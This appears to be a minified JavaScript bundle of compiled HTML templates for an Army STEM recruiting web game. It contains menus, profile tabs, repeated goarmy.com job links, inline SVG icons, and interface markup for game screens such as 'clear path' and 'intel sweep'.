class="tooltip">twitter</div><div class="icon"><!-- Generator: Adobe Illustrator 19.1.0, SVG Export Plug-In  -->\n<svg version="1.1"\n	 xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:a="http://ns.adobe.com/AdobeSVGViewerExtensions/3.0/"\n	 x="0px" y="0px" width="16.8px" height="13.7px" viewBox="0 0 16.8 13.7" style="enable-background:new 0 0 16.8 13.7;"\n	 xml:space="preserve">\n<defs>\n</defs>\n<path d="M15.8,3.4c0,0.1,0,0.3,0,0.5c0,4.6-3.9,9.8-10.2,9.8c-1.9,0-4-1-5.6-2c0.3,0,0.1,0,0.4,0c1.5,0,3.2,0,4.4-1\n	c-1.5,0-2.5-1.1-3-2.4c0.2,0.1,0.3,0,0.5,0c0.3,0,0.6,0.1,0.9,0C1.7,8,0.3,6.5,0.3,4.9c0,0,0,0,0,0c0.5,0.2,1.3,0.5,2,0.5\n	c-1-0.6-2-1.7-2-2.9c0-0.7,0.2-1.4,0.5-2c1.7,2.1,4.5,3.8,7.3,3.9c-0.1-0.2,0-0.8,0-1C8.1,1.5,9.5,0,11.4,0c1,0,2,0.3,2.6,1\n	c0.8-0.1,1.3-0.6,2-1c-0.3,0.8-0.8,1.5-1.5,2c0.7-0.1,1.8-0.2,2.3-0.5C16.4,2.1,15.8,2.9,15.8,3.4z"/>\n</svg>\n</div><div class="hex"></div></div></div><div class="cancel-container"><div class="btn rect-btn cancel"><div class="label">cancel</div>'),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){s[a];i.push('<div class="mask"><span>cancel</span></div>')}else{var e=0;for(var a in s){e++;s[a];i.push('<div class="mask"><span>cancel</span></div>')}}}.call(this),i.push("</div></div>"),i.join("")},"main-menu":function(s){var i=[],a=s||{};return function(s,a){i.push('<div class="main-menu"><div class="menu-buttons">'),s.device.type?"mobile"===s.device.type&&i.push('<div rel="mobile-recon" class="rect-btn btn item">recon</div>'):(i.push('<div rel="mission" class="rect-btn btn item"><div class="label">mission</div>'),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){s[a];i.push('<div class="mask"><span>mission</span></div>')}else{var e=0;for(var a in s){e++;s[a];i.push('<div class="mask"><span>mission</span></div>')}}}.call(this),i.push("</div>")),i.push('<div rel="training-room" class="rect-btn btn item"><div class="label">training</div>'),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){s[a];i.push('<div class="mask"><span>training</span></div>')}else{var e=0;for(var a in s){e++;s[a];i.push('<div class="mask"><span>training</span></div>')}}}.call(this),i.push('</div><div rel="about" class="rect-btn btn item"><div class="label">about</div>'),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){s[a];i.push('<div class="mask"><span>about</span></div>')}else{var e=0;for(var a in s){e++;s[a];i.push('<div class="mask"><span>about</span></div>')}}}.call(this),i.push('</div><div rel="profile" class="rect-btn btn item"><div class="label">profile</div>'),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){s[a];i.push('<div class="mask"><span>profile</span></div>')}else{var e=0;for(var a in s){e++;s[a];i.push('<div class="mask"><span>profile</span></div>')}}}.call(this),i.push("</div>"),a.logged_in===!1?(i.push('<div rel="login" class="rect-btn btn item"><div class="label">log in</div>'),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){s[a];i.push('<div class="mask"><span>log in</span></div>')}else{var e=0;for(var a in s){e++;s[a];i.push('<div class="mask"><span>log in</span></div>')}}}.call(this),i.push("</div>")):(i.push('<div rel="logout" class="rect-btn btn item"><div class="label">log out</div>'),function(){var s=[1,2,3,4,5];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){s[a];i.push('<div class="mask"><span>log out</span></div>')}else{var e=0;for(var a in s){e++;s[a];i.push('<div class="mask"><span>log out</span></div>')}}}.call(this),i.push("</div>")),i.push("</div></div>")}.call(this,"client"in a?a.client:"undefined"!=typeof client?client:void 0,"user"in a?a.user:"undefined"!=typeof user?user:void 0),i.join("")},"mobile-recon":function(s){var i=[];return i.join("")},preloader:function(s){var i=[];return i.push('<img src="./assets/imgs/loader.gif"/>'),i.join("")},"profile-jobs-tab":function(s){var i=[];return i.push('<div class="jobs-tab tab"><div class="view-all-block"><span class="go-army">DO YOU HAVE WHAT IT TAKES TO MAKE THE CUT?</span><a href="http://www.goarmy.com/careers-and-jobs/about-army-stem.html?iom=AD32-5021-ACNP-MS-GOM-XX-LOG-GM-XX-X-XXX" target="_blank" class="view-all-button btn">VIEW ALL<div class="open-tab-icon"></div></a></div><div class="jobs"><div class="scroller"><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/signals-intelligence-analyst.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-Q41" target="_blank" class="job btn"><div class="label">Signal Intelligence Analyst</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/cryptologic-linguist.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-XXX" target="_blank" class="job btn"><div class="label">Cryptologic Linguist</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/special-forces-medical-sergeant.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-SF3" target="_blank" class="job btn"><div class="label">Special Forces Medical Sergeant</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/special-forces-engineer-sergeant.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-SF5" target="_blank" class="job btn"><div class="label">Special Forces Engineer Sergeant</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/computers-and-technology/cryptologic-network-warfare-specialist.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-DE6" target="_blank" class="job btn"><div class="label">CRYPTOLOGIC NETWORK WARFARE SPECIALIST</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/computers-and-technology/geospatial-intelligence-imagery-analyst.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-DD2" target="_blank" class="job btn"><div class="label">GEOSPATIAL INTELLIGENCE IMAGERY ANALYST</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/computers-and-technology/information-technology-specialist.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-TR5" target="_blank" class="job btn"><div class="label">INFORMATION TECHNOLOGY SPECIALIST</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/transportation-and-aviation/unmanned-aerial-vehicle-operator.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-Q39" target="_blank" class="job btn"><div class="label">UNMANNED AIRCRAFT SYSTEMS OPERATOR</div><div class="open-tab-icon"></div></a></div></div></div>'),i.join("")},profile:function(s){var i=[];return i.push('<div class="login-status"><div class="status-text">save your progress</div><div class="login-btn btn">log in</div></div><div class="content"><div class="content-left"><div class="tab-buttons section-labels"><div class="profile-button tab-button section-label">profile</div><div class="leaderboard-button tab-button section-label">leaderboard</div><div class="jobs-button tab-button section-label">opportunities</div></div><div class="tabs"><div class="profile-tab tab active"><div class="scroller"><div class="user-score"></div><div class="profile-user-stem"><div class="science category"><div class="letter">S</div><div class="score-bar-holder"><div data-label="SCIENCE" class="label">SCIENCE</div><div class="score-bar"><div class="score-value">10000</div><div class="score-ratio-bar"></div></div></div></div><div class="technology category"><div class="letter">T</div><div class="score-bar-holder"><div data-label="TECHNOLOGY" class="label">TECHNOLOGY</div><div class="score-bar"><div class="score-value">10000</div><div class="score-ratio-bar"></div></div></div></div><div class="engineering category"><div class="letter">E</div><div class="score-bar-holder"><div data-label="ENGINEERING" class="label">ENGINEERING</div><div class="score-bar"><div class="score-value">10000</div><div class="score-ratio-bar"></div></div></div></div><div class="math category"><div class="letter">M</div><div class="score-bar-holder"><div data-label="MATH" class="label">MATH</div><div class="score-bar"><div class="score-value">10000</div><div class="score-ratio-bar"></div></div></div></div></div><div class="profile-score-meters"><div class="score-meters-sizer"></div></div></div></div><div class="leaderboard-tab tab"><div class="user-score"></div><div class="scores"><div class="scroller"></div></div></div><div class="jobs-tab tab"><div class="view-all-block"><span class="go-army">DO YOU HAVE WHAT IT TAKES TO MAKE THE CUT?</span><a href="http://www.goarmy.com/careers-and-jobs/about-army-stem.html?iom=AD32-5021-ACNP-MS-GOM-XX-LOG-GM-XX-X-XXX" target="_blank" class="view-all-button btn">VIEW ALL<div class="open-tab-icon"></div></a></div><div class="jobs"><div class="scroller"><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/signals-intelligence-analyst.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-Q41" target="_blank" class="job btn"><div class="label">Signal Intelligence Analyst</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/cryptologic-linguist.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-XXX" target="_blank" class="job btn"><div class="label">Cryptologic Linguist</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/special-forces-medical-sergeant.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-SF3" target="_blank" class="job btn"><div class="label">Special Forces Medical Sergeant</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/special-forces-engineer-sergeant.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-SF5" target="_blank" class="job btn"><div class="label">Special Forces Engineer Sergeant</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/computers-and-technology/cryptologic-network-warfare-specialist.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-DE6" target="_blank" class="job btn"><div class="label">CRYPTOLOGIC NETWORK WARFARE SPECIALIST</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/computers-and-technology/geospatial-intelligence-imagery-analyst.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-DD2" target="_blank" class="job btn"><div class="label">GEOSPATIAL INTELLIGENCE IMAGERY ANALYST</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/computers-and-technology/information-technology-specialist.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-TR5" target="_blank" class="job btn"><div class="label">INFORMATION TECHNOLOGY SPECIALIST</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/transportation-and-aviation/unmanned-aerial-vehicle-operator.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-Q39" target="_blank" class="job btn"><div class="label">UNMANNED AIRCRAFT SYSTEMS OPERATOR</div><div class="open-tab-icon"></div></a></div></div></div></div></div><div class="content-right"><div class="jobs-block"><div class="section-labels"><div class="section-label">opportunities</div></div><div class="jobs-tab tab"><div class="view-all-block"><span class="go-army">DO YOU HAVE WHAT IT TAKES TO MAKE THE CUT?</span><a href="http://www.goarmy.com/careers-and-jobs/about-army-stem.html?iom=AD32-5021-ACNP-MS-GOM-XX-LOG-GM-XX-X-XXX" target="_blank" class="view-all-button btn">VIEW ALL<div class="open-tab-icon"></div></a></div><div class="jobs"><div class="scroller"><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/signals-intelligence-analyst.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-Q41" target="_blank" class="job btn"><div class="label">Signal Intelligence Analyst</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/cryptologic-linguist.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-XXX" target="_blank" class="job btn"><div class="label">Cryptologic Linguist</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/special-forces-medical-sergeant.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-SF3" target="_blank" class="job btn"><div class="label">Special Forces Medical Sergeant</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/special-forces-engineer-sergeant.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-SF5" target="_blank" class="job btn"><div class="label">Special Forces Engineer Sergeant</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/computers-and-technology/cryptologic-network-warfare-specialist.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-DE6" target="_blank" class="job btn"><div class="label">CRYPTOLOGIC NETWORK WARFARE SPECIALIST</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/computers-and-technology/geospatial-intelligence-imagery-analyst.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-DD2" target="_blank" class="job btn"><div class="label">GEOSPATIAL INTELLIGENCE IMAGERY ANALYST</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/computers-and-technology/information-technology-specialist.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-TR5" target="_blank" class="job btn"><div class="label">INFORMATION TECHNOLOGY SPECIALIST</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/transportation-and-aviation/unmanned-aerial-vehicle-operator.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-Q39" target="_blank" class="job btn"><div class="label">UNMANNED AIRCRAFT SYSTEMS OPERATOR</div><div class="open-tab-icon"></div></a></div></div></div></div></div></div>'),
i.join("")},prompt:function(s){var i,a=[],e=s||{};return function(s,e){a.push('<div class="message">'+jade.escape(null==(i=s)?"":i)+'</div><div class="accept-btn rect-btn btn">'+jade.escape(null==(i=e)?"":i)+'</div><div class="btn close-btn corner-btn"><div class="icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid" width="12.68" height="12.75" viewBox="0 0 12.68 12.75">\n  <defs>\n    <style>\n      .cls-1 {\n        fill: #ffcb05;\n        fill-rule: evenodd;\n      }\n    </style>\n  </defs>\n  <g>\n    <path d="M-0.002,0.740 L5.998,6.740 L6.682,6.010 L0.682,0.010 " class="cls-1"/>\n    <path d="M7.998,8.740 L11.998,12.740 L12.682,12.010 L8.682,8.010 " class="cls-1"/>\n    <path d="M11.998,0.010 L12.682,0.740 L0.682,12.740 L-0.002,12.010 L11.998,0.010 Z" class="cls-1"/>\n  </g>\n</svg>\n</div></div>')}.call(this,"message"in e?e.message:"undefined"!=typeof message?message:void 0,"accept"in e?e.accept:"undefined"!=typeof accept?accept:void 0),a.join("")},"job-tiles":function(s){var i=[];return i.push('<a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/signals-intelligence-analyst.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-Q41" target="_blank" class="job btn"><div class="label">Signal Intelligence Analyst</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/cryptologic-linguist.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-XXX" target="_blank" class="job btn"><div class="label">Cryptologic Linguist</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/special-forces-medical-sergeant.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-SF3" target="_blank" class="job btn"><div class="label">Special Forces Medical Sergeant</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/intelligence-and-combat-support/special-forces-engineer-sergeant.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-SF5" target="_blank" class="job btn"><div class="label">Special Forces Engineer Sergeant</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/computers-and-technology/cryptologic-network-warfare-specialist.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-DE6" target="_blank" class="job btn"><div class="label">CRYPTOLOGIC NETWORK WARFARE SPECIALIST</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/computers-and-technology/geospatial-intelligence-imagery-analyst.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-DD2" target="_blank" class="job btn"><div class="label">GEOSPATIAL INTELLIGENCE IMAGERY ANALYST</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/computers-and-technology/information-technology-specialist.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-TR5" target="_blank" class="job btn"><div class="label">INFORMATION TECHNOLOGY SPECIALIST</div><div class="open-tab-icon"></div></a><a href="http://www.goarmy.com/careers-and-jobs/browse-career-and-job-categories/transportation-and-aviation/unmanned-aerial-vehicle-operator.html?iom=AD32-5021-ACNP-MS-GOM-XX-GCL-GM-XX-X-Q39" target="_blank" class="job btn"><div class="label">UNMANNED AIRCRAFT SYSTEMS OPERATOR</div><div class="open-tab-icon"></div></a>'),i.join("")},"triangle-wand":function(s){var i=[];return i.push('<div class="triangle-wand"><div class="double-wand"></div></div>'),i.join("")},clear_path:function(s){var i=[];return i.push('<div id="clear-path" class="game-main"><canvas class="fullframe webgl"></canvas><div class="css fullframe"></div><div class="pixi_stage"></div><div class="clock"><div class="wand left large"></div><div class="time"></div><div class="wand right large"></div></div><div class="panels left"><div class="panel camera-panel disabled"><div class="title"><div class="text">cameras</div><div class="wand right"></div></div><div class="cam-rotation"><div btn="1" class="btn active">1</div><div btn="2" class="btn">2</div><div btn="3" class="btn">3</div></div></div><div class="panel map-panel"><div class="title"><div class="text">map</div><div class="wand right"></div></div></div></div><div class="panels right"><div class="panel charges"><div class="title"><div class="text">explosives</div><div class="wand right"></div></div><div class="container"><div class="count"></div></div></div><div class="panel detonate"><div class="tmDeploy"><div class="stemSideline"></div><div class="tmC tmTxt">detonate</div><div class="tmC tmC1"></div><div class="tmC tmC2"></div><div class="tmC tmC3"></div><div class="tmC stemBtn"></div></div>\n</div></div><div class="detail-panel hidden"><div class="header"><span>rock sample</span><div class="btn close-btn corner-btn"><div class="wand"></div><div class="icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid" width="12.68" height="12.75" viewBox="0 0 12.68 12.75">\n  <defs>\n    <style>\n      .cls-1 {\n        fill: #ffcb05;\n        fill-rule: evenodd;\n      }\n    </style>\n  </defs>\n  <g>\n    <path d="M-0.002,0.740 L5.998,6.740 L6.682,6.010 L0.682,0.010 " class="cls-1"/>\n    <path d="M7.998,8.740 L11.998,12.740 L12.682,12.010 L8.682,8.010 " class="cls-1"/>\n    <path d="M11.998,0.010 L12.682,0.740 L0.682,12.740 L-0.002,12.010 L11.998,0.010 Z" class="cls-1"/>\n  </g>\n</svg>\n</div></div></div><div class="content"><div class="item mass"><span class="title">_mass:</span><span class="wand"></span><span class="value"></span></div><div class="item dimensions"><span class="title">_dimensions:</span><span class="wand"></span><span class="value"></span></div><div class="item material"><span class="title">_material:</span><span class="wand"></span><span class="value"></span></div></div></div><div class="overlay fullframe hidden"><div class="center"><div class="analyzing"><div class="black fullframe"><div class="text">analyzing path</div></div><div class="white fullframe"><div class="text">analyzing path</div></div><div class="success fullframe"><div class="text">path cleared</div></div><div class="failure fullframe"><div class="text">path obstructed</div></div></div></div></div></div>'),i.join("")},field_medicine:function(s){var i=[];return i.push('<div id="field-medicine" class="game-main"><div id="game-webgl"></div><div class="clock"><div class="wand left large"></div><div class="time"></div><div class="wand right large"></div></div><div id="game-ui" class="noselect"></div><div id="game-overlay"></div></div>'),i.join("")},intel_sweep:function(s){var i=[],a=s||{};return function(s){i.push('<div id="intel-sweep" class="game-main"><canvas class="grabbable"></canvas><div class="cam-rotation"><div class="label">CAMERA</div><div btn="0" class="btn active">1</div><div btn="1" class="btn">2</div><div btn="2" class="btn">3</div><div btn="3" class="btn">4</div></div><div class="clock"><div class="wand left large"></div><div class="time"></div><div class="wand right large"></div></div><div class="panels info-panels left"><div class="panel filter-panel"><div class="title"><div class="text">filter</div><div class="wand right"></div></div><div class="search-field"><input type="text" placeholder="KEYWORDS"/><div class="icon"><!-- Generator: Adobe Illustrator 19.0.1, SVG Export Plug-In  -->\n<svg version="1.1"\n	 xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:a="http://ns.adobe.com/AdobeSVGViewerExtensions/3.0/"\n	 x="0px" y="0px" width="89.7px" height="89.5px" viewBox="0 0 89.7 89.5" style="enable-background:new 0 0 89.7 89.5;"\n	 xml:space="preserve">\n<defs>\n</defs>\n<path d="M33.2,8.5C46.9,8.5,58,19.6,58,33.2C58,46.9,46.9,58,33.2,58C19.6,58,8.4,46.9,8.4,33.2C8.4,19.6,19.6,8.5,33.2,8.5 M33.2,0\n	C14.9,0,0,14.9,0,33.2s14.9,33.2,33.2,33.2s33.2-14.9,33.2-33.2S51.6,0,33.2,0L33.2,0z"/>\n<rect x="46.9" y="65.8" transform="matrix(0.7071 0.7071 -0.7071 0.7071 70.1127 -29.1496)" width="46.6" height="8.5"/>\n</svg>\n</div></div><div class="btn audio-btn corner-btn active"><div class="icon"><div></div><div></div><div></div><div></div></div></div><div class="btn text-btn corner-btn active"><div class="icon">T</div></div><div class="btn image-btn corner-btn active"><div class="icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid" width="9" height="9" viewBox="0 0 9 9">\n	<defs>\n		<style>\n			.cls-images {\n				stroke-linejoin: round;\n				stroke-width: 1px;\n				fill-opacity: 0;\n			}\n		</style>\n	</defs>\n	<g>\n		<rect x="2.5" y="0.5" width="6" height="6" class="cls-images"/>\n		<rect x="0.5" y="2.5" width="6" height="6" class="cls-images"/>\n	</g>\n</svg>\n</div></div></div><div class="panel intel-panel"><div class="title"><div class="text">intel</div><div class="wand right"></div></div><div class="intel-folder"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid" width="76" height="58" viewBox="0 0 76 58">\n  <defs>\n    <style>\n      .cls-folder {\n        fill: #fff;\n        stroke: #fff;\n        stroke-linejoin: round;\n        stroke-opacity: 0.3;\n        stroke-width: 1px;\n        fill-opacity: 0;\n        fill-rule: evenodd;\n      }\n    </style>\n  </defs>\n  <g>\n    <path d="M0.500,0.500 L47.472,0.500 L47.607,10.656 L75.500,10.656 L75.500,57.500 L0.500,57.500 L0.500,0.500 Z" class="cls-folder"/>\n    <image xlink:href="data:img/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEEAAAAmAgMAAADmaB40AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAADFBMVEUAAAD///////8AAAA4fh26AAAAA3RSTlMAVtZ5J0ntAAAAAWJLR0QAiAUdSAAAAAlwSFlzAAALEgAACxIB0t1+/AAAABtJREFUKM9jYEADDugCDA2jIqMiAyCyCg00AACMRB1hw84xkwAAAABJRU5ErkJggg==" x="10.5" y="19.5" width="65" height="38"/>\n  </g>\n</svg>\n<div class="count"><span class="success">0</span><span class="slash">/</span><span class="total">5</span></div><div class="intel-box">'),function(){var s=[1,2,3,4];if("number"==typeof s.length)for(var a=0,e=s.length;e>a;a++){s[a];i.push('<div class="box box-x inactive"><!-- Generator: Adobe Illustrator 19.0.1, SVG Export Plug-In  -->\n<svg version="1.1"\n	 xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:a="http://ns.adobe.com/AdobeSVGViewerExtensions/3.0/"\n	 x="0px" y="0px" width="14.7px" height="14.7px" viewBox="0 0 14.7 14.7" style="enable-background:new 0 0 14.7 14.7;"\n	 xml:space="preserve">\n<style type="text/css">\n	.box-x-0{fill:#FE5B60;fill-opacity:0.5;stroke:#FE5B60;}\n	.box-x-1{opacity:0.5;fill:#FE5B60;enable-background:new    ;}\n</style>\n<defs>\n</defs>\n<rect x="2.3" y="2.4" class="box-x-0" width="10" height="10"/>\n<path class="box-x-1" d="M0.7,14.7L0,14L14,0l0.7,0.7L0.7,14.7z"/>\n<path class="box-x-1" d="M0,0.7L0.7,0l14,14L14,14.7L0,0.7z"/>\n</svg>\n</div>')}else{var e=0;for(var a in s){e++;s[a];i.push('<div class="box box-x inactive"><!-- Generator: Adobe Illustrator 19.0.1, SVG Export Plug-In  -->\n<svg version="1.1"\n	 xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:a="http://ns.adobe.com/AdobeSVGViewerExtensions/3.0/"\n	 x="0px" y="0px" width="14.7px" height="14.7px" viewBox="0 0 14.7 14.7" style="enable-background:new 0 0 14.7 14.7;"\n	 xml:space="preserve">\n<style type="text/css">\n	.box-x-0{fill:#FE5B60;fill-opacity:0.5;stroke:#FE5B60;}\n	.box-x-1{opacity:0.5;fill:#FE5B60;enable-background:new    ;}\n</style>\n<defs>\n</defs>\n<rect x="2.3" y="2.4" class="box-x-0" width="10" height="10"/>\n<path class="box-x-1" d="M0.7,14.7L0,14L14,0l0.7,0.7L0.7,14.7z"/>\n<path class="box-x-1" d="M0,0.7L0.7,0l14,14L14,14.7L0,0.7z"/>\n</svg>\n</div>')}}}.call(this),i.push('</div></div></div><div class="panel comsec-panel"><div class="title"><div class="text">comsec</div><div class="wand right"></div></div><div class="count audio-count"><img src="/assets/imgs/intel-sweep/com_audio_200.png" class="icon"/><div class="label">audio</div><div class="wand"></div><div class="value">00000</div></div><div class="count text-count"><img src="/assets/imgs/intel-sweep/com_text_200.png" class="icon"/><div class="label">text</div><div class="wand"></div><div class="value">00000</div></div><div class="count image-count"><img src="/assets/imgs/intel-sweep/com_photo_200.png" class="icon"/><div class="label">image</div><div class="wand"></div><div class="value">00000</div></div></div></div><div class="hover-item"><div class="header"><span class="name"></span><span class="date"></span></div><div class="content"><div class="item audio-item"><img'+jade.attr("src",""+s.IMGS+"intel-sweep/eq-white.png",!0,!1)+'/></div><div class="item text-item"><div class="text"></div></div><div class="item image-item"><img/><div class="screen-overlay"></div></div></div></div><div class="selected-overlay"><div class="selected-dot-signal"></div><div class="selected-dot-signal"></div><div class="selected-dot-signal"></div><div class="selected-dot-signal"></div><div class="selected-dot"></div><div class="dashed-lines"><div class="dashed-line"></div><div class="dashed-line"></div><div class="dashed-line"></div><div class="dashed-line"></div><div class="dashed-line"></div><div class="dashed-line"></div></div></div><div class="selected-item detail-panel"><audio loop="loop"></audio><div class="header"><span class="name"></span><span class="date"></span><div class="btn close-btn"><div class="wand"></div><div class="icon"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid" width="12.68" height="12.75" viewBox="0 0 12.68 12.75">\n  <defs>\n    <style>\n      .cls-1 {\n        fill: #ffcb05;\n        fill-rule: evenodd;\n      }\n    </style>\n  </defs>\n  <g>\n    <path d="M-0.002,0.740 L5.998,6.740 L6.682,6.010 L0.682,0.010 " class="cls-1"/>\n    <path d="M7.998,8.740 L11.998,12.740 L12.682,12.010 L8.682,8.010 " class="cls-1"/>\n    <path d="M11.998,0.010 L12.682,0.740 L0.682,12.740 L-0.002,12.010 L11.998,0.010 Z" class="cls-1"/>\n  </g>\n</svg>\n</div></div></div><div class="content"><div class="action-btns"><div class="btn submit-btn">submit to HQ</div><div class="btn dismiss-btn">dismiss intel</div></div><div class="btn-group"><div class="btn translate-btn corner-btn disabled"><div class="wand"></div><div class="icon"><img'+jade.attr("src",""+s.IMGS+"intel-sweep/icon-translate.png",!0,!1)+'/></div><div class="tooltip"><div class="label">Translate comm</div></div></div><div class="btn camera-btn corner-btn disabled"><div class="wand"></div><div class="icon"><!-- Generator: Adobe Illustrator 19.0.1, SVG Export Plug-In  -->\n<svg version="1.1"\n	 xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:a="http://ns.adobe.com/AdobeSVGViewerExtensions/3.0/"\n	 x="0px" y="0px" width="88.5px" height="71.4px" viewBox="0 0 88.5 71.4" style="enable-background:new 0 0 88.5 71.4;"\n	 xml:space="preserve">\n<style type="text/css">\n	.st0{fill:none;stroke:#FFFFFF;stroke-width:6;stroke-miterlimit:10;}\n</style>\n<defs>\n</defs>\n<g>\n	<path class="st0" 